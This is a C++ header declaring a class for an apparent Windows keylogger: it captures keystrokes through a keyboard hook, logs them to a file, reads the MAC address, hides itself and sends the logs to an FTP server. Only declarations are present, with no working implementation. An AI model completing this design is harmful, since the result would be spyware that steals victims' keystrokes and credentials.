#include <string>
#include <stdio.h>
#include <Windows.h>
#include <tchar.h>
#include <iphlpapi.h>
#include <ShObjIdl.h>
#include <iostream>
#include <fstream>
#include <chrono>
#include <unordered_map>
#include <wininet.h>

#pragma comment(lib, "wininet")
#pragma comment(lib, "iphlpapi.lib")

typedef std::tr1::unordered_map<std::string, std::string> NewMap;

class UtilFuncs {
public:
	void VKCodetoString(PKBDLLHOOKSTRUCT keyInfo, std::string& str);
	void treatShiftCases(std::string& keyName);
	void treatNumpadCases(std::string& keyName);
	void writeLogToFile(NewMap loggedKeys);
	void getMacAddress();
	void Hide();
	void sendToFTPServer();
	std::string macAddress;
	std::vector<std::string> logsToSend;
};

